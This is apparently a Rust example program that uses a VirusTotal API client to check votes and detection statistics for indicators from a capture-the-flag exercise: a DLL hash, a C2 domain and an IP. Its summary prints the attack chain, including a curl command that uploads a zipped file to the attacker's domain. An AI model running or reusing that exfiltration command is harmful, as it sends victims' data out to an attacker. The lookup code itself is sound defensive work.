use std::env;
use tokio::time::{sleep, Duration};
use virustotal_rs::common::{AnalysisStats, VoteStats};
use virustotal_rs::{ApiTier, Client, ClientBuilder};

async fn create_client() -> Result<Client, Box<dyn std::error::Error>> {
    let api_key = env::var("VTI_API_KEY").expect("VTI_API_KEY environment variable not set");
    println!("Using API key from VTI_API_KEY environment variable");

    Ok(ClientBuilder::new()
        .api_key(api_key)
        .tier(ApiTier::Public)
        .build()?)
}

fn display_votes(votes: Option<&VoteStats>) {
    if let Some(votes) = votes {
        println!(
            "  📊 Votes: {} malicious, {} harmless",
            votes.malicious, votes.harmless
        );
    }
}

fn display_analysis_stats(stats: Option<&AnalysisStats>, is_file: bool) {
    if let Some(stats) = stats {
        let total = stats.malicious + stats.suspicious + stats.harmless + stats.undetected;
        if is_file {
            println!(
                "  🔍 Detection: {}/{} engines flagged as malicious",
                stats.malicious, total
            );
        } else {
            println!(
                "  🔍 Detection: {}/{} engines",
                stats.malicious + stats.suspicious,
                total
            );
        }
    }
}

async fn check_file(client: &Client, hash: &str) {
    println!("\n🔍 7z.dll ({})", &hash[..16]);
    println!("  Checking existing data...");
    sleep(Duration::from_secs(15)).await;

    match client.files().get(hash).await {
        Ok(file) => {
            println!("  ✅ File data retrieved");
            display_votes(file.object.attributes.total_votes.as_ref());
            display_analysis_stats(file.object.attributes.last_analysis_stats.as_ref(), true);
        }
        Err(e) => println!("  ❌ Error: {}", e),
    }
}

async fn check_domain(client: &Client, domain: &str) {
    println!("\n🌐 Domain: {}", domain);
    println!("  Checking existing data...");
    sleep(Duration::from_secs(15)).await;

    match client.domains().get(domain).await {
        Ok(domain_data) => {
            println!("  ✅ Domain data retrieved");
            display_votes(domain_data.object.attributes.total_votes.as_ref());
            display_analysis_stats(
                domain_data.object.attributes.last_analysis_stats.as_ref(),
                false,
            );
        }
        Err(e) => println!("  ❌ Error: {}", e),
    }
}

async fn check_ip(client: &Client, ip: &str) {
    println!("\n🌐 IP Address: {}", ip);
    println!("  Checking existing data...");
    sleep(Duration::from_secs(15)).await;

    match client.ip_addresses().get(ip).await {
        Ok(ip_data) => {
            println!("  ✅ IP data retrieved");
            display_votes(ip_data.object.attributes.total_votes.as_ref());
            display_analysis_stats(
                ip_data.object.attributes.last_analysis_stats.as_ref(),
                false,
            );
            println!(
                "  📍 Location: {:?} (AS{:?} - {:?})",
                ip_data.object.attributes.country,
                ip_data.object.attributes.asn,
                ip_data.object.attributes.as_owner
            );
        }
        Err(e) => println!("  ❌ Error: {}", e),
    }
}

fn display_summary(dll_hash: &str) {
    println!("\n{}", "=".repeat(60));
    println!("📌 CTF APT 111 Summary");
    println!("{}", "=".repeat(60));
    println!("\n🎯 Attack Chain:");
    println!("  1. DLL Side-loading: 7z.dll");
    println!("  2. Data Collection: ipconfig, netstat, tasklist, net commands");
    println!("  3. Archiving: zip.exe 1.zip 1.txt");
    println!("  4. Exfiltration: curl -F file=@1.zip https://office.msftupdated.com");
    println!("  5. Cleanup: rm 1.txt, rm 1.zip");
    println!("\n📊 Infrastructure:");
    println!("  • C2 Domain: office.msftupdated.com");
    println!("  • C2 IP: 35.208.137.212 (Google Cloud)");
    println!("  • Malware: 7z.dll (SHA256: {})", &dll_hash[..32]);
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = create_client().await?;

    // Resources from the CTF
    let dll_hash = "02032ea322036e66f2825a0342979ad942ad5e201a674dc1c0085617467d661c";
    let domain = "office.msftupdated.com";
    let ip = "35.208.137.212";

    println!("\n{}", "=".repeat(60));
    println!("📊 CHECKING EXISTING COMMENTS & VOTES");
    println!("{}", "=".repeat(60));
    println!("\n⚠️  Note: Daily quota may be exceeded. Trying read-only operations...");

    check_file(&client, dll_hash).await;
    check_domain(&client, domain).await;
    check_ip(&client, ip).await;
    display_summary(dll_hash);

    Ok(())
}
